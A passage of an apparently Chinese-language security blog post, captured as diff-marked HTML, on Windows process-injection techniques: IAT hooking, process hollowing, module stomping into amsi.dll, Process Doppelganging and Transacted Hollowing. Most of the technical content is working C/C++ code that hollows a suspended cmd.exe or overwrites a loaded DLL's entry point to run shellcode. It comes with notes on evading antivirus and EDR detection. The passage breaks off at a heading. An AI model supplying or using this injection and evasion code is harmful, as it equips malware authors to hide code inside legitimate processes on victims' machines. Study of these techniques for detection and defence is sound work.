+<h4 id="IAT-hook-修改函数地址"><a href="#IAT-hook-修改函数地址" class="headerlink" title="IAT hook -修改函数地址"></a>IAT hook -修改函数地址</h4><p>其中IAT hook前后的区别</p>
+<p>hook前</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.调用messageBoxA函数</span><br><span class="line">2.程序在IAT中查找MessageBoxA的地址</span><br><span class="line">3.代码执行跳转到第二步解析的地址</span><br></pre></td></tr></table></figure>
+
+<p>hook后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.像hook之前一样调用MessageBoxA</span><br><span class="line">2.在IAT中查找MessageBoxA的地址</span><br><span class="line">3.因为IAT被修改，IAT中MessageBoxA的地址指向了hookedMessagebox函数地址</span><br><span class="line">4.程序跳转到hookedMessagebox</span><br><span class="line">5.hookedmessagebox 函数拦截MessageBoxA参数并执行一些恶意代码</span><br><span class="line">6.hookedMessageBox 调用合法的MessageBoxA例程</span><br></pre></td></tr></table></figure>
+
+<p>说明：</p>
+<p>IAT hook通常由诸如目标进程的dll执行，为了简便，在下面的例子中，IAT hook 是在本地进程实现的</p>
+<p>IAT hook大致步骤：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.保存原来的MessageBoxA内存地址</span><br><span class="line">2.定义MessageBoxA函数原型</span><br><span class="line">3.使用上述原型创建一个HookedMessagebox函数</span><br><span class="line">4.解析IAT表，直到找到MessageBoxA的地址</span><br><span class="line">5.用hookedMessagebox的地址替换MessageBoxA的地址</span><br></pre></td></tr></table></figure>
+
+<p>IATHook</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/0range-x/windows/blob/main/injection/IAThook.cpp">https://github.com/0range-x/windows/blob/main/injection/IAThook.cpp</a></p>
+<h2 id="hollowing"><a href="#hollowing" class="headerlink" title="hollowing"></a>hollowing</h2><p>进程镂空，又叫傀儡进程，是一种防御规避的进程注入技术，主要思想是写在合法进程的内存，写入恶意软件的代码，伪装成合法进程进行恶意活动。</p>
+<p>看到有些文章说需要取消生成重定位表，但是我这里没有取消，也是可以正常镂空注入成功的，是因为在使用<code>VirtualAllocEx</code>申请内存空间是，将傀儡进程的<code>ImageBaseAddress</code>作为申请空间的首地址，这样就避免了重定位的问题。</p>
+<p><img src="/2022/11/12/inject/image-20221018162621742.png" alt="image-20221018162621742"></p>
+<p>peb偏移8个字节处， 这个进程的装载地址，就是pe可选头里的imagebase</p>
+<p><img src="/2022/11/12/inject/image-20221019111241988.png" alt="image-20221019111241988"></p>
+<p>两种方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.镂空已有进程模块：直接修改进程中已有模块的代码节，注入恶意代码</span><br><span class="line">2.先注入后镂空：注入一个合法dll(拥有合法签名)，然后修改dll入口点出代码为自己想执行的代码</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="process-hollowing"><a href="#process-hollowing" class="headerlink" title="process hollowing"></a>process hollowing</h4><p><img src="https://www.malwarebytes.com/blog/images/uploads/2018/08/hollowing1-1_.png" alt="img"></p>
+<p>可以看到进程中是没有fg.exe这一项的，比较隐蔽</p>
+<p><img src="/2022/11/12/inject/image-20221019002721682.png" alt="image-20221019002721682"></p>
+<p>大致流程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.创建一个挂起的合法进程(CreateProcess  CREATE_SUSPENDED)</span><br><span class="line">2.清空新进程的内存数据(NtUnmapViewofSection)</span><br><span class="line">3.申请新的内存(VirtualAllocEx)</span><br><span class="line">4.向内存中写入shellcode(WriteProcessMemory)</span><br><span class="line">5.设置入口点(SetThreadContext)</span><br><span class="line">6.恢复进程执行shellcode(ResumeThread)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>实现</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* pNtUnmapViewOfSection)</span><span class="params">(HANDLE, PVOID)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">hollowing</span><span class="params">(<span class="keyword">char</span> path[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	PVOID FileBuffer;</span><br><span class="line">	HANDLE hFile;</span><br><span class="line">	DWORD FileReadSize;</span><br><span class="line">	DWORD dwFileSize;</span><br><span class="line"></span><br><span class="line">	PVOID RemoteImageBase;			<span class="comment">//peb中可执行映像的基址</span></span><br><span class="line">	PVOID RemoteProcessMemory;		<span class="comment">//镂空进程中分配的内存空间</span></span><br><span class="line"></span><br><span class="line">	STARTUPINFO si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;			<span class="comment">//进程句柄修改内存空间</span></span><br><span class="line">	CONTEXT ctx;</span><br><span class="line">	ctx.ContextFlags = CONTEXT_FULL;</span><br><span class="line">	si.cb = <span class="built_in"><span class="keyword">sizeof</span></span>(si);</span><br><span class="line">	<span class="comment">//创建一个挂起的进程</span></span><br><span class="line">	BOOL bRet = <span class="built_in">CreateProcessA</span>(<span class="literal">NULL</span>, (LPSTR)<span class="string">&quot;cmd.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_SUSPENDED, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//给恶意代码分配内存空间</span></span><br><span class="line">	hFile = <span class="built_in">CreateFileA</span>(path, GENERIC_READ, <span class="literal">NULL</span>, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	dwFileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line">	FileBuffer = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">	<span class="comment">//将磁盘文件读取到申请的内存空间</span></span><br><span class="line">	<span class="built_in">ReadFile</span>(hFile, FileBuffer, dwFileSize, &amp;FileReadSize, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line"></span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)FileBuffer;</span><br><span class="line">	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((LPBYTE)FileBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class="line">	PIMAGE_FILE_HEADER pPEHeader = (PIMAGE_FILE_HEADER)(((DWORD)pNtHeader) + <span class="number">4</span>);</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER32 pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class="line">	PIMAGE_SECTION_HEADER pSectionHeader;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取挂起进程的线程上下文</span></span><br><span class="line">	<span class="built_in">GetThreadContext</span>(pi.hThread, &amp;ctx);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//x86环境从ebx寄存器中获取peb地址，并从peb中目标进程的基址(偏移8个字节)到RemoteImageBase</span></span><br><span class="line">	<span class="comment">//可选头中的imagebase</span></span><br><span class="line">	<span class="built_in">ReadProcessMemory</span>(pi.hProcess, (PVOID)(ctx.Ebx + <span class="number">8</span>), &amp;RemoteImageBase, <span class="built_in"><span class="keyword">sizeof</span></span>(PVOID), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//判断文件预期加载地址是否被占用</span></span><br><span class="line">	pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtUnmapViewOfSection&quot;</span>);</span><br><span class="line">	<span class="comment">//挖空已加载的地址</span></span><br><span class="line">	<span class="keyword">if</span> ((SIZE_T)RemoteImageBase == pNtHeader-&gt;OptionalHeader.ImageBase)</span><br><span class="line">		<span class="built_in">NtUnmapViewOfSection</span>(pi.hProcess, RemoteImageBase);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//为可执行映像分配新内存，并写入文件头</span></span><br><span class="line">	RemoteProcessMemory = <span class="built_in">VirtualAllocEx</span>(pi.hProcess, (PVOID)pOptionHeader-&gt;ImageBase, pOptionHeader-&gt;SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="built_in">WriteProcessMemory</span>(pi.hProcess, RemoteProcessMemory, FileBuffer, pOptionHeader-&gt;SizeOfHeaders, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//逐段写入</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pPEHeader-&gt;NumberOfSections; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)FileBuffer + pDosHeader-&gt;e_lfanew + <span class="built_in"><span class="keyword">sizeof</span></span>(IMAGE_NT_HEADERS) + i * <span class="built_in"><span class="keyword">sizeof</span></span>(IMAGE_SECTION_HEADER));</span><br><span class="line">		<span class="built_in">WriteProcessMemory</span>(pi.hProcess, (PVOID)((LPBYTE)RemoteProcessMemory + pSectionHeader-&gt;VirtualAddress), (PVOID)((LPBYTE)FileBuffer + pSectionHeader-&gt;PointerToRawData), pSectionHeader-&gt;SizeOfRawData, <span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//更改程序入口点</span></span><br><span class="line">	ctx.Eax = (SIZE_T)((LPBYTE)RemoteProcessMemory + pOptionHeader-&gt;AddressOfEntryPoint);</span><br><span class="line">	<span class="built_in">WriteProcessMemory</span>(pi.hProcess, (PVOID)(ctx.Ebx + (<span class="built_in"><span class="keyword">sizeof</span></span>(SIZE_T) * <span class="number">2</span>)), &amp;pOptionHeader-&gt;ImageBase, <span class="built_in"><span class="keyword">sizeof</span></span>(PVOID), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//设置线程上下文</span></span><br><span class="line">	<span class="built_in">SetThreadContext</span>(pi.hThread, &amp;ctx);</span><br><span class="line">	<span class="comment">//恢复挂起线程</span></span><br><span class="line">	<span class="built_in">ResumeThread</span>(pi.hThread);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>不足之处</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.Unmap 目标进程的exe模块，比较可疑，现在的杀软一般都会检测Unmap</span><br><span class="line">2.如果没有Unmap，而是直接覆写程序，那么覆写地址的页属性就不是共享的，也很可疑</span><br><span class="line">3.在内存中的pe映像与在硬盘中不同</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>规避流程</p>
+<p><img src="/2022/11/12/inject/image-20221103233102407.png" alt="image-20221103233102407"></p>
+<h4 id="dll-hollowing（Module-Stomping）"><a href="#dll-hollowing（Module-Stomping）" class="headerlink" title="dll hollowing（Module Stomping）"></a>dll hollowing（Module Stomping）</h4><p>先注入后镂空：注入一个合法dll(拥有合法签名)，然后修改dll入口点出代码为自己想执行的代码</p>
+<p>优点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.不会分配RWX内存页面</span><br><span class="line">2.不会更改dll在目标进程中的权限</span><br><span class="line">3.shellcode被注入到合法的 Windows dll中</span><br></pre></td></tr></table></figure>
+
+<p>缺点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ReadProcessMemory/WriteProcessMemory  api调用通常是由调试器而不是正常程序使用。</span><br><span class="line">可以只用NtMapViewOfSection 将shellcode注入远程进程，减少对WriteProcessMemory的调用</span><br></pre></td></tr></table></figure>
+
+<p>大致流程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.远程注入一个系统dll</span><br><span class="line">2.获取该模块在目标进程的虚拟地址</span><br><span class="line">3.定位模块的入口点</span><br><span class="line">4.修改入口点为shellcode的入口点</span><br><span class="line">5.创建远程线程</span><br></pre></td></tr></table></figure>
+
+<p>demo</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">GetProcessIdByName</span><span class="params">(LPCTSTR lpszProcessName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hSnapshot == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	PROCESSENTRY32 pe;</span><br><span class="line">	pe.dwSize = <span class="keyword">sizeof</span> pe;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (Process32First(hSnapshot, &amp;pe))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (lstrcmpi(lpszProcessName, pe.szExeFile) == <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				CloseHandle(hSnapshot);</span><br><span class="line">				<span class="keyword">return</span> pe.th32ProcessID;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">while</span> (Process32Next(hSnapshot, &amp;pe));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CloseHandle(hSnapshot);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ModuleStomping</span><span class="params">(LPCTSTR lpszProcessName,<span class="keyword">unsigned</span> <span class="keyword">char</span> *shellcode)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> ModuleName[] = <span class="string">&quot;C:\\windows\\system32\\amsi.dll&quot;</span>;</span><br><span class="line">	HMODULE hModules[<span class="number">256</span>] = &#123;&#125;;</span><br><span class="line">	SIZE_T hModulesSize = <span class="keyword">sizeof</span>(hModules);</span><br><span class="line">	DWORD dwhModulesSizeNeeded = <span class="number">0</span>;</span><br><span class="line">	DWORD dwmoduleNameSize = <span class="number">0</span>;</span><br><span class="line">	SIZE_T hModulesCount = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> rModuleName[<span class="number">128</span>] = &#123;&#125;;</span><br><span class="line">	HMODULE rModule = <span class="literal">NULL</span>;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="comment">//注入一个起始dll到远程进程</span></span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetProcessIdByName(lpszProcessName));</span><br><span class="line">	<span class="comment">//分配待注入dll大小的内存空间</span></span><br><span class="line">	LPVOID lpBuffer = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, <span class="keyword">sizeof</span>(ModuleName), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">	<span class="comment">//将dll写进 远程进程的内存空间</span></span><br><span class="line">	WriteProcessMemory(hProcess, lpBuffer, (LPVOID)ModuleName, <span class="keyword">sizeof</span>(ModuleName), <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">//显式加载</span></span><br><span class="line">	PTHREAD_START_ROUTINE threadRoutine = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">	<span class="comment">//执行该dll</span></span><br><span class="line">	HANDLE dllThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, threadRoutine, lpBuffer, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	WaitForSingleObject(dllThread, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//枚举notepad加载的所有dll模块，存放到hModules数组中</span></span><br><span class="line">	EnumProcessModulesEx(hProcess, hModules, hModulesSize, &amp;dwhModulesSizeNeeded, LIST_MODULES_ALL);</span><br><span class="line">	hModulesCount = dwhModulesSizeNeeded / <span class="keyword">sizeof</span>(HMODULE);</span><br><span class="line">	<span class="comment">//循环所有dll找到我们刚刚load的 amsi.dll</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; hModulesCount; i++)&#123;</span><br><span class="line">		rModule = hModules[i];</span><br><span class="line">		GetModuleBaseNameA(hProcess, rModule, rModuleName, <span class="keyword">sizeof</span>(rModuleName));</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strcmp</span>(rModuleName, <span class="string">&quot;amsi.dll&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取dll的程序入口点</span></span><br><span class="line">	DWORD headerBufferSize = <span class="number">0x1000</span>;		<span class="comment">//申请一页的内存空间</span></span><br><span class="line">	LPVOID peHeader = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, headerBufferSize);</span><br><span class="line"></span><br><span class="line">	ReadProcessMemory(hProcess, rModule, peHeader, headerBufferSize, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)peHeader;</span><br><span class="line">	PIMAGE_NT_HEADERS pNTHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)peHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line">	LPVOID dllEntryPoint = (LPVOID)(pNTHeader-&gt;OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)rModule);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//在dll的入口点写入shellcode</span></span><br><span class="line">	WriteProcessMemory(hProcess, dllEntryPoint, (LPCVOID)shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//执行shellcode</span></span><br><span class="line">	CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (PTHREAD_START_ROUTINE)dllEntryPoint, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line">	CloseHandle(dllThread);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>实现效果</p>
+<p><img src="/2022/11/12/inject/image-20221020154416080.png" alt="image-20221020154416080"></p>
+<p><img src="/2022/11/12/inject/image-20221020154716646.png" alt="image-20221020154716646"></p>
+<p>看下这个线程的地址，执行的是我们的shellcode</p>
+<p><img src="/2022/11/12/inject/image-20221020155051688.png" alt="image-20221020155051688"></p>
+<h2 id="Process-Doppelganging"><a href="#Process-Doppelganging" class="headerlink" title="Process Doppelganging"></a>Process Doppelganging</h2><p>该方法在2017年的bh上提出</p>
+<p>优点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.避免了特殊的内存操作，比如SuspendProcess 和 NtUnmapViewOfSection</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://www.malwarebytes.com/blog/images/uploads/2018/08/dopel1_.png" alt="img"></p>
+<p>简要流程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.打开一个正常文件，创建一个transaction(NtCreateTransaction)</span><br><span class="line">2.打开源程序句柄（CreateFileTransacted）</span><br><span class="line">3.向源程序句柄写入shellcode(CreateFile,CreateFileMapping,MapViewOfFile,VirtualAlloc,memcpy,WriteFile)</span><br><span class="line">4.根据此时的文件内容，创建一个section(NtCreateSection)</span><br><span class="line">5.回滚到修改事务之前的状态，抹去一系列更改操作(RollbackTransaction)</span><br><span class="line">6.通过刚刚创建的section，创建进程(NtCreateProcessEx)</span><br><span class="line">7.准备参数到目标进程(跨进程)</span><br><span class="line">8.创建初始线程(NtCreateThreadEx)，之后唤醒线程(NtResumeThread)</span><br></pre></td></tr></table></figure>
+
+<p>在win10  复现失败</p>
+<p><img src="/2022/11/12/inject/image-20221020165055844.png" alt="image-20221020165055844"></p>
+<p>针对错误代码 <code>c0000022</code>  权限不足的问题，换一个 创建进程的api，<code>CreateProcessInternalW</code>，该api并没有在kernel32中导出，因此需要自己实现</p>
+<p><a target="_blank" rel="noopener" href="http://a-twisted-world.blogspot.com/2008/03/createprocessinternal-function.html">http://a-twisted-world.blogspot.com/2008/03/createprocessinternal-function.html</a></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//don&#x27;t forget to load functiond before use:</span></span><br><span class="line"><span class="comment">//load_kernel32_functions();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">BOOL</span> </span><br><span class="line">(WINAPI *CreateProcessInternalW)(HANDLE hToken, </span><br><span class="line">    LPCWSTR lpApplicationName, </span><br><span class="line">    LPWSTR lpCommandLine,</span><br><span class="line">    LPSECURITY_ATTRIBUTES lpProcessAttributes,</span><br><span class="line">    LPSECURITY_ATTRIBUTES lpThreadAttributes,</span><br><span class="line">    BOOL bInheritHandles,</span><br><span class="line">    DWORD dwCreationFlags, </span><br><span class="line">    LPVOID lpEnvironment, </span><br><span class="line">    LPCWSTR lpCurrentDirectory, </span><br><span class="line">    LPSTARTUPINFOW lpStartupInfo,</span><br><span class="line">    LPPROCESS_INFORMATION lpProcessInformation,</span><br><span class="line">    PHANDLE hNewToken</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">load_kernel32_functions</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HMODULE hKernel32 = <span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;kernel32&quot;</span>);</span><br><span class="line">    CreateProcessInternalW = (<span class="built_in">BOOL</span> (WINAPI *)(HANDLE, LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION, PHANDLE)) <span class="built_in">GetProcAddress</span>(hKernel32,<span class="string">&quot;CreateProcessInternalW&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (CreateProcessInternalW == <span class="literal">NULL</span>) <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而使用此api替换NTcreateprocess 的方法，结合process hollowing，衍生出了transacted hollowing</p>
+<p>先简单来说下NTFS，我们可以在transaction中创建一个文件，在commit transaction之前，对于其他进程来说，这个文件是不可见的，比如（AV、edr）所以写入shellcode是较为隐蔽的一种方式</p>
+<h2 id="Transacted-Hollowing"><a href="#Transacted-Hollowing" class="headerlink" title="Transacted Hollowing"></a>Transacted Hollowing</h2><p><a target="_blank" rel="noopener" href="https://www.malwarebytes.com/blog/news/2018/08/process-doppelganging-meets-process-hollowing_osiris">https://www.malwarebytes.com/blog/news/2018/08/process-doppelganging-meets-process-hollowing_osiris</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/hasherezade/transacted_hollowing">https://github.com/hasherezade/transacted_hollowing</a></p>
+<p>大致流程</p>
